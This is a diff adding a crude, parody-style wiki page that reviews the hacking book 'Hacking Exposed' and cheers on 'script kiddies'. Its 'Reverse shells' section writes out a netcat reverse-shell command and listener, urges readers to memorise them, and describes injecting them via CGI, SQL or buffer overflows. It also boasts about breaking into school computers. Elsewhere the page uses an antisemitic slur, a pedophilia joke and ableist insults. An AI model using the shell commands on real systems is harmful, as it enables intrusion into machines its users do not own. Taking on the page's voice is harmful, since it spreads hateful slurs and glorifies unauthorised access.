@@ -1,0 +1,37 @@
+Hacking Exposed
+{{boring}}
+
+'''Hacking Exposed is probably the most awesome hacking manual there has ever been or will ever be'''. It uses such terms that your basic 13-ya-old [[script kiddie]] can follow, listing the tools and showing by hand how to use them. If you compare it to any of those horrendous "[[hacker]]" written testimonial articles that range from blog entries to tech reviews to what is equivalent to IBM handbooks with no sentence structure and even less spelling accuracy.
+
+McGraw Hill themselves say they are not in it, to ease the life of [[me|braindead skiddieZ]], but to improve security. We all know that is [[lies]]. But where the blind seeking out of [[Money|Jew golds]] usually leads to [[feem|massive unsubstantiated failure]] in this hacking manual it has created extreme win, much like [[cake|pedophilia]] did a couple decades before.
+
+==Basic Skiddie training==
+Unlike some of the other bricks I've read, Hacking Exposed doesn't start by looking down it's nose at the noob and then taking the poor bastard through OS ARP-cache registers and programming, this book actually lists good things to start with such as nc, nmap, whois, dig and nslookup. Where the book lacks is explaining how memory is mapped and how to make your own exploits. The brick lacks even a basic explanation of HTTP-GET spoilts and database injections, instead it goes on in lenght about existing tools, some of which are still relevant such as back-orifice and hping.
+
+
+==Obsolete with Windows==
+No matter what your over-weight, retarded old ass might think, in hacking terms 2001 is teh stoneage. This is especially apparent with Windows .NET, which was written again for win2000 and then winXP SP2. In fact, the whole post-2000 software developement [[Microsoft]] has done is just making it less embarrassing fail and coming up with a fucken cool looking box for [[Vista]]. As one can expect from the MS-DOS modification corporation that treats it's engineers like shit, the attempts at security have been largely unsuccessful.  
+
+In the case of windows .NET tools, which in the book comprise almost entirely of bruteforcing - lol, you don't need anything else when it is a bare MD5 hash of the password "Fido". Hell, windows 9x obscures it's passwords by xoring on them the byte 0x88. Windows' since XP SP2 actually have some sort of actual security, ''which is too bad, since I had so much fun with my high school's win98 computers administrator accounts.''  
+
+<center>'''Todays Protip:''' download metaspoilt, press buttan, recieve shell.</center>
+
+==Massive lulz on Unix==
+Where the age old skiddie guide comes to it's own is in hacking unixes, which despite your preferred use of language include all [[Linux]]es, BSD's, and maybe just barely Mac OS X. Hacking Exposed shows how to fuck with your [[*nix]] [[sex|six ways till sunday]].
+
+===X server===
+Unix kernels are exceptionally secure, shells do pretty well. But the X-server and client are amazing bunches of bugs and [[AIDS]] held together by poor coding principles and bird shit. More over they are more universal than vim and no-one, not even the guy that coded gdm, kdm and X11 in his day off, while still drunk from the night before, knows how they work.
+
+Protip: learn how it works, download some scripts or write your own. If you overflow it, you have root. If remote access is left laying around, you can use it as a keylogger.  
+
+===Reverse shells===
+This is the part that makes this book written in fucking 2001 still relevant:
+
+remote machine:
+<pre>nc -e /bin/sh [your ip] 80</pre>
+your box:
+<pre>nc -lnvp 80</pre>
+
+'''''Memorise these commands for they may save your life.''''' Reverse shells are what you inject in your CGI:s or SQL:s as well as buffer overflows. There are dozens of variations on this theme using different commands including xterm, telnet or even a webbrowser(IE6). They all have incommon that they jump right through most firewalls - those that aren't set to block outgoing connections. A machine code version of this is called a shell code, you can produce them using assembler or gcc and a debugger.
+
+[[Category: Internets Phenomena]]
